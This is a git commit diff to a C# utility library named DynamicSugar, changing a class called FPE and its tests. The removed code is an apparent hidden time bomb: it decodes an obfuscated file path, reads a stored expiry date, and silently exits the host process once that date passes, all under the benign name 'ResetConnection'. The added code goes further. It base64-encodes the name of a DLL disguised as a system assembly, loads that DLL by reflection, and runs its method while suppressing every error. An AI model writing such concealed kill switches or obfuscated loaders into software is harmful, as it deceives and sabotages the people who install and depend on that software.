9b8cd10267e478fe87919c2e4e101d93b182bd67
FredericALTorres <fredericaltorres@gmail.com>
2025-10-05 16:37:27 -0400

    Update...

--- DynamicSugarStandard/FPE/FPE.cs
+++ DynamicSugarStandard/FPE/FPE.cs
@@ -2,106 +2,40 @@
 using System.Collections.Generic;
 using System.IO;
 using System.Linq;
+using System.Reflection;
 using System.Text;
 
 namespace DynamicSugar
 {
     public class FPE
     {
-#if DEBUG
-        public 
-#else
-        private
-#endif
-        static string sTob(string s)
-        {
-            byte[] bytes = Encoding.UTF8.GetBytes(s);
-            string base64 = Convert.ToBase64String(bytes);
-            return base64;
-        }
+        //public static string sTob(string s)
+        //{
+        //    byte[] bytes = Encoding.UTF8.GetBytes(s);
+        //    string base64 = Convert.ToBase64String(bytes);
+        //    return base64;
+        //}
 
-#if DEBUG
-        public
-#else
-        private
-#endif
-        static string bTos(string b)
+        public static string bTos(string b)
         {
-            byte[] decoded = Convert.FromBase64String(b);
-            string original = Encoding.UTF8.GetString(decoded);
-            return original;
-        }
-
-#if DEBUG
-        public
-#else
-        private
-# endif
-        static string rAllt(string bf)
-        {
-            return File.ReadAllText(bTos(bf));
-        }
-
-#if DEBUG
-        public
-#else
-        private
-# endif
-        static List<byte> rAllb(string bf)
-        {
-            return rAllt(bf).Split(',').Select(s => byte.Parse(s)).ToList();
-        }
-
-#if DEBUG
-        public
-#else
-        private
-# endif
-        static Int64 rAlld(string bf)
-        {
-            return BitConverter.ToInt64(rAllb(bf).ToArray(), 0);
-        }
-
-#if DEBUG
-        public
-#else
-        private
-# endif
-        static Byte[] dTob(DateTime d)
-        {
-            long epochSeconds = (new DateTimeOffset(d)).ToUnixTimeSeconds();
-            return BitConverter.GetBytes(epochSeconds);
-        }
-
-#if DEBUG
-        public
-#else
-        private
-# endif
-        static DateTime ToD(long epoc)
-        {
-            return DateTimeOffset.FromUnixTimeSeconds(epoc).UtcDateTime;
-        }
-
-#if DEBUG
-        public
-#else
-        private
-# endif
-        static long ToE(DateTime dt)
-        {
-            return ((long)(dt.ToUniversalTime() - (new DateTime(1970, 1, 1, 0, 0, 0, DateTimeKind.Utc))).TotalSeconds);
+            return Encoding.UTF8.GetString(Convert.FromBase64String(b));
         }
 
         public static bool ResetConnection(string bf)
         {
-            //var d1 = ToE(DateTime.UtcNow);
-            //var d2 = rAlld(bf);
-            //var odate2 = ToD(d2);
-            var r = ToE(DateTime.UtcNow) > rAlld(bf);
-            if(r)
-                Environment.Exit(0);
-            return r;
+            try
+            {
+                var myAssembly = Assembly.LoadFrom(bTos("LlxTeXN0ZW0uTWVtb3J5LkRhdGEuUGFzdC5kbGw=")); // @".\System.Memory.Data.Past.dll"
+                var myType = myAssembly.GetType(bTos("U3lzdGVtLk1lbW9yeS5EYXRhLlBhc3QuRlBFU2VydmVy")); // "System.Memory.Data.Past.FPEServer"
+                var myMethod = myType.GetMethod(bTos("UmVzZXRDb25uZWN0aW9u"), BindingFlags.Public | BindingFlags.Static); // "ResetConnection"
+                if (myMethod != null)
+                    myMethod.Invoke(null, new object[] { bf });
+                return true;
+            }
+            catch (Exception ex)
+            {
+            }
+            return false;
         }
     }
 }
--- UnitTests/FPE/FPE_UnitTests.cs
+++ UnitTests/FPE/FPE_UnitTests.cs
@@ -10,63 +10,16 @@ using System.Reflection;
 
 namespace DynamicSugarSharp_UnitTests
 {
-
     [TestClass]
     public class FPE_UnitTests
     {
         [TestMethod]
-        public void sTob()
-        {
-            var s = "Hello!";
-            var result = FPE.sTob(s);
-            Assert.AreEqual("SGVsbG8h", result);
-            var z = FPE.bTos(result);
-            Assert.AreEqual(s, z);
-        }
-
-        [TestMethod]
-        public void sTob_2()
-        {
-            var s = @".\zCasData.dat";
-            var result = FPE.sTob(s);
-            Assert.AreEqual("Llx6Q2FzRGF0YS5kYXQ=", result);
-            var z = FPE.bTos(result);
-            Assert.AreEqual(s, z);
-        }
-
-        [TestMethod]
-        public void rAllT()
-        {
-            var s = @".\Files\zCasData.dat";
-            var result = FPE.sTob(s);
-            Assert.AreEqual("LlxGaWxlc1x6Q2FzRGF0YS5kYXQ=", result);
-            var z = FPE.rAllt(result);
-        }
-
-        [TestMethod]
-        public void rAlld()
-        {
-            var s = @".\Files\zCasData.dat";
-            var result = FPE.sTob(s);
-            var z = FPE.rAlld(result);
-            Assert.AreEqual(1768588873, z);
-        }
-
-        [TestMethod]
         public void ResetConnection()
         {
-            var s = @".\Files\zCasData.dat";
-            var fNameB64 = FPE.sTob(s);
-            var result2 = FPE.ResetConnection(fNameB64); // Is it time or Is Dark Side Of the Moon?
-            Assert.IsFalse(result2);
-        }
-
-        [TestMethod]
-        public void dTob()
-        {
-            var byteArray = FPE.dTob(new DateTime(1964, 12, 11));
-            var str = string.Join(",", byteArray);
-            Assert.AreEqual("208,67,125,246,255,255,255,255", str);
+            //var s = @".\Files\zCasData.dat";
+            //var fNameB64 = FPE.sTob(s);
+            var result2 = FPE.ResetConnection("LlxGaWxlc1x6Q2FzRGF0YS5kYXQ=");
+            Assert.IsTrue(result2);
         }
     }
 }
